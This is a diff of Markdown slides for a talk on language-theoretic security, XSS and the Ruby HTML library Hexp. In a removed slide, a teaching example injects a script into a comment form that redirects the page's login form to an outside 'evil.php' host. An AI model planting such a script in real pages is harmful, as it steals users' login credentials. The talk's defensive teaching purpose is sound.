@@ -1,134 +1,133 @@
 # Web Linguistics
+{:.eurucamp}
 
 ## Towards Higher Fluency
 
 by Arne Brasseur / [plexus](https://github.com/plexus)
 
 ---
+{: .noborder .whoami}
 
-Moi
+### Who am I?
+
+Arne Brasseur
 
 Freelance Ruby Dev
 
-Shoes, Rails Girls Berlin, Ruby Monsters
-
 Twitter / Github : @plexus
 
----
-
-![Screenshot of the Langsec website (langsec.org)](images/yaml_new_eval.png)
+![](images/railsgirls_bln.png) ![](images/shoes-icon.png) ![](images/ruby_lambik.png)
 
 ---
+{:.heading}
+
+# Stop using strings to handle structured data!
+
+---
+{:.big}
+
+## Why do we do this anyway?
+
+Plain text == Universal data type
+
+It's **"Pragmatic"!**
+
+---
+{:.big}
+
+## What's the alternative?
+
+Input & output are **formal languages**
+
+We have tools for those
+
+---
+{:.bigsections}
+
+## Apples and Snakes
+
+Keep the **snakes** out of the app
+
+parse/generate at the app boundary
+
+Inside the app, only **apples**
+
+---
+{:.noborder}
+
+![](images/snakes_and_apples.png)
+
+---
+
+# #langsec
+
+---
+
+![Screenshot of the Langsec website (langsec.org)](images/langsec_website.png)
+
+---
+
+## WATCH THIS TALK!
+
+![](images/science_of_insecurity.png)
+
+---
+{:.bigsections}
+
+## Langsec
+
+Stop ad-hoc recognition / validation / processing
+
+![](images/occupy_babel_1.jpg)
+Photoshopped by <a href="http://www.anevern.com">Kythera of Anevern</a>.
+{:.aside}
+
+![](images/occupy_babel_2.jpg)
+Photoshopped by <a href="http://www.anevern.com">Kythera of Anevern</a>.
+{:.aside}
+
+---
+{: .heading}
 
 # XSS
 
 ## Cross site scripting
 
+---
+{:.big}
+
+## XSS
+
+The most common vulnerability
+
+More common than buffer overflows
+
+---
+{:.bigheadings}
+
+## Preventing XSS
+
+"Classic" solution : `escape_html`
+
+Rails 3 : SafeBuffer + `html_safe`
 
 ---
 {:.big}
 
-XSS enables attackers to inject client-side script into Web pages viewed by other users
+Whitelist > Blacklist
 
----
-
-A simple comment form
-
-<form>
-  <label>Add a comment</label><br />
-  <textarea rows="5" cols="80">
-<script>
- document.getElementById('login_form').
-   action="http://208.246.24.14/evil.php"
-</script>
-</textarea><br />
-  <input type="submit" />
-</form>
-
----
-
-We naively display the comment
-
-```ruby
-"<div class='comment'>#{ comment }</div>"
-```
+But : **We're still manually deciding what (not) to escape**
 
 ---
 {:.big}
-
-Each time someone visits our site,
-the malicious code gets executed.
-
----
-
-The common wisdom is to "escape" the inserted value
-
-```html
-<div class='comment'>#{ escape_html(comment) }</div>
-```
-
-Now the code is harmless
-
-```html
-<div class='comment'>
-  &lt;script&gt; ... &lt;/script&gt;
-</div>
-```
-
----
-{:.big}
-
-But XSS is still rampant,
-more common than buffer overflows
-
----
-{:.big}
-
-**why** is it so **hard?**
-
----
-
-Manual escaping? **hard**
-
-Let's automate!
-
-```html
-# using HTML::SafeBuffer
-<div class='comment'><%= comment %></div>
-```
-
-And it **just works**
-
----
-
-We've turned the problem around
-
-Whitelist instead of blacklist
-
-```ruby
-def helper
-  "<p> haikus are pretty <p>".html_safe
-end
-```
-
-**We're still manually deciding what (not) to escape**
-
----
-
-# The String Problem
-
----
-
-![Screenshot of the Langsec website (langsec.org)](images/devil_in_plain_text.png)
-
----
 
 ## The problem
 
-Semantics of string are twofold
+What is a String?
 
-* a string
+* a piece of text
 * a textual representation of HTML
+* a piece of text that is HTML escaped
 
 ---
 {:.big}
@@ -137,20 +136,19 @@ HTML is structured data,
 let's treat it as such
 
 ---
-
-![Screenshot of the Langsec website (langsec.org)](images/langsec_website.png)
-
----
+{:.heading}
 
 # Language
 
 ## langue, taal, sprache, 語言
 
 ---
+{:.noborder}
 
 ![](images/platypus_cloud.png)
 
 ---
+{:.noborder}
 
 ![](images/platypus_graph.png)
 
@@ -158,20 +156,20 @@ let's treat it as such
 
 ````dot
 graph platypus {
-  node[shape=none color=blue fontcolor=blue];
-  edge[color=blue];
+  node[shape=none color=blue fontname="Lato"]
+  edge[dir=none color=black penwidth=3]
 
-  s[label=sentence shape=oval];
+  s[label=sentence shape=none];
   subject[];
   action[];
   place[];
   verb[];
   object[];
 
-  platypus[fontcolor=red];
-  carry[fontcolor=red];
-  chicken[fontcolor=red];
-  forest[fontcolor=red];
+  platypus[fontcolor=red shape=circle];
+  carry[fontcolor=red shape=circle];
+  chicken[fontcolor=red shape=circle];
+  forest[fontcolor=red shape=circle];
 
   s -- subject
   subject -- platypus
@@ -185,7 +183,6 @@ graph platypus {
 }
 ````
 
-
 ---
 
 <span class="box">A platypus</span><span class="box">is carrying</span><span class="box">a chicken</span><span class="box">in the forest</span>
@@ -195,196 +192,24 @@ graph platypus {
 ![](images/waveform.gif)
 
 ---
+{:.big}
 
 ## Magic of language
 
-* Listener reconstructs abstract representation
-* Identical "tree" is shared between speakers
-* Each derive meaning from this representation
+Identical "tree" is shared between speakers
+
+Because we speak the same language
 
 ---
+{:.heading}
 
-# Formal Language
-
----
-{:.big}
-
-a **formal language** is
-a **set of strings** of symbols
-governed by **strict rules**
-
----
-
-```
-alphabet = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
-            +, *, (, ), =}
-```
-
----
-{:.big}
-
-These rules form the **grammar**
-of the language, they specify
-how to **generate** valid strings
-
----
-
-```
-<EQUATION>   ::= <sum> = <sum>
-
-<digit >     ::= 0 | 1 | 2 | 3 | 4 |
-                 5 | 6 | 7 | 8 | 9
-
-<sum>        ::= *<digit> + *<digit>
-```
-
----
-{:.big}
-
-We can represent
-how the grammar rules are applied
-using a **syntax tree**
-
----
-
-```dot
-graph {
-  node[shape=none]
-
-
-  exp1[label="expression"]
-  eq[label="=" fontcolor="blue"]
-  exp2[label="expression"]
-
-  num1[label="number"]
-  plus[label="+" fontcolor="blue"]
-  num2[label="number"]
-
-  num3[label="number"]
-  times[label="*" fontcolor="blue"]
-  num4[label="number"]
-
-  digit1[label="digit"]
-  digit2[label="digit"]
-  digit3[label="digit"]
-  digit4[label="digit"]
-
-  5[fontcolor="blue"]
-  3[fontcolor="blue"]
-  2[fontcolor="blue"]
-  4[fontcolor="blue"]
-
-  equation -- exp1
-  equation -- eq
-  equation -- exp2
-
-  exp1 -- sum
-  sum -- num1
-  sum -- plus
-  sum -- num2
-  num1 -- digit1
-  num2 -- digit2
-  digit1 -- 5
-  digit2 -- 3
-
-  exp2 -- product
-  product -- num3
-  product -- times
-  product -- num4
-  num3 -- digit3
-  num4 -- digit4
-  digit3 -- 2
-  digit4 -- 4
-}
-```
-{:.center width="850px"}
-
----
-{:.big}
-
-The **meaning** of a sentence
-corresponds with
-its **syntax tree**
-
----
-
-## Language is everywhere
-
-* Programming languages
-* Markup & styling languages
-* Data languages
-* Network protocols
-
----
-{:.big}
-
-Your application either
-**consumes** or **generates**
-these languages
-
----
-{:.big}
-
-In either case it should
-use **syntax trees**
-to do so
-
----
-{:.center}
-
-# #langsec
-
----
-
-When handling input
-
-* Treat it as a formal language
-* Separate recognition from processing
-
----
-
-If input handling is done ad-hoc
-
-* recognition is scattered across the program
-* it doesn't match the programmer's assumptions
-* it becomes a weird machine for an attacker to program
-
----
-
-[Language-Theoretic security research](http://langsec.org)
-
-Meredith L. Patterson : **"The Science of Insecurity"**
-
----
-{:.big}
-
-We can apply similar reasoning to **output** handling
-
----
-
-When generating output
-
-* Treat it as a formal language
-* Separate language generation from program logic
-
----
-
-If output handling is done ad-hoc
-
-* language generation is scattered across the program
-* it doesn't match the programmer's assumptions
-* it becomes a weird machine for an attacker to program
-
----
-{:.big}
-
-XSS is a Failure at the Language Level
+# XSS is a Failure at the Language Level
 
 ---
 
 ```dot
 digraph commmunication {
-  edge[dir=none color=white penwidth=3]
+  edge[dir=none color=black penwidth=3]
   node[label="" shape=circle color=blue style=filled]
 
   z1[color=green];
@@ -425,8 +250,8 @@ digraph commmunication {
 
 ```dot
 digraph commmunication {
-  edge[dir=none color=white penwidth=3]
-  node[label="" shape=circle color=blue style=filled]
+  edge[dir=none color=black penwidth=3]
+  node[label="" shape=square color=blue style=filled]
 
   z1[color=green];
 
@@ -470,19 +295,34 @@ digraph commmunication {
 ```
 
 ---
-{:.center}
+{:.heading}
 
 # Abolish Your Templates, Burn Your Helpers
 
 ---
 {:.big}
 
+## So what if we ...
+
 Create a HTML **data structure**
 Serialize it **in one pass**
 In **pure Ruby**
 
 ---
-{:.center}
+{:.bigsections}
+
+## Benefits
+
+HTML generation is no longer ad-hoc
+
+Output is guaranteed well-formed
+
+Output is strict (because browsers)
+
+A new world of programming opportunities!
+
+---
+{:.heading}
 
 # Hexp
 
@@ -493,6 +333,8 @@ An API for **generating**
 and **manipulating**
 **HTML** syntax trees
 
+[http://github.com/plexus/hexp](http://github.com/plexus/hexp)
+
 ---
 {:.big}
 
@@ -500,7 +342,12 @@ What **Rack** does for **HTTP**
 **Hexp** does for **HTML**
 
 ---
-{:.center}
+{:.big}
+
+Hexp objects are **immutable**
+API **inspired by jQuery**
+
+---
 
 # Creating nodes
 
@@ -510,7 +357,6 @@ What **Rack** does for **HTTP**
 
 ```ruby
 div = Hexp::Node.new(:div, class: 'strong')
-# => H[:div, {"class" => "strong"}]
 ```
 
 ---
@@ -525,7 +371,6 @@ list = Hexp.build do
    end
   end
 end
-# => H[:ul, [H[:li, ["0"]], H[:li, ["1"]], H[:li, ["2"]]]]
 ```
 
 ---
@@ -542,59 +387,23 @@ toc = H[:ol, {class: 'toc'}, [
 ```
 
 ---
-
-## Manipulating Nodes
-
-```ruby
-doc.rewrite('head') do |head|
-  head.add(H[:script,
-    src: 'http://code.jquery.com/jquery-1.10.1.min.js'])
-end
-```
-
-```ruby
-div.add_class('sidebar')
-```
-
----
+{:.big}
 
 ## Reusable 'Middleware'
 
-For example
-
+* Lint / validate
+* Populate forms
+* Add admin links
 * Inline CSS/JS/images
-* Pretty print
-* Populate forms (cfr. Formless)
 
 ---
+{:.big}
 
-## Reusable widgets
+## Reusable Widgets
 
 * Menus
 * Breadcrumbs
 * Forms
-* Header / Footer
-
-cfr. [Showpiece](https://github.com/begriffs/showpiece)
-
----
-
-## Example : discount module
-
-```ruby
-doc.rewrite('form.checkout input[type=submit]') do |submit|
-  [ discount_form_field, submit ]
-end
-
-def discount_form_field
-  Hexp.build do
-    div do
-      label 'Discount code', for: 'discount'
-      input name: 'discount', type: 'text'
-    end
-  end
-end
-```
 
 ---
 
@@ -605,9 +414,9 @@ class BookWidget < Struct.new(:book, :tag)
   include Hexp
 
   def to_hexp
-    H[tag, {class: 'book-entry', id: "book-#{book.id}"}, [
+    H[tag, {class: 'book', id: "book-#{book.id}"}, [
         H[:h2, book.title],
-        H[:img, src: book.image.url(:medium)]
+        H[:img, src: book.image.url]
       ]
     ]
   end
@@ -615,35 +424,41 @@ end
 ```
 
 ---
+{:.big}
 
-with `include Hexp` all DSL methods redirect to `to_hexp`
+## Modules
 
-tag, attributes, children, attr, rewrite, select, to_html, class?, add_class, add_child, add, process, %, text, remove_attr, set_attributes
+Great for CRM / e-commerce, or for modularizing your own app
+
+---
+
+## Example : discount module
+
+```ruby
+doc.replace('form.checkout') do |form|
+  form.add_child(discount_field)
+end
+
+discount_field = H[:div, [
+    H[:label, {for: 'discount'}, 'Discount code'],
+    H[:input, {type: 'text', name: 'discount'}]
+  ]
+]
+
+```
 
 ---
 
 ## Hexpress
 
+[http://github.com/plexus/hexpress](http://github.com/plexus/hexpress)
+
 * Converts Markdown to Hexp
-* Contains a bunch of 'Processors'
+* Contains a bunch of 'Middleware'
   * AddImpressJs
   * GraphvizDotToSVG
   * MakeSelfContained
 * Powers this presentation
-
----
-
-## Working with designers
-
-* Create widgets with semantic markup
-* Create a Living Styleguide
-
-
-
----
-{:.huge .center}
-
-Q ?
 
 ---
 {:.center}
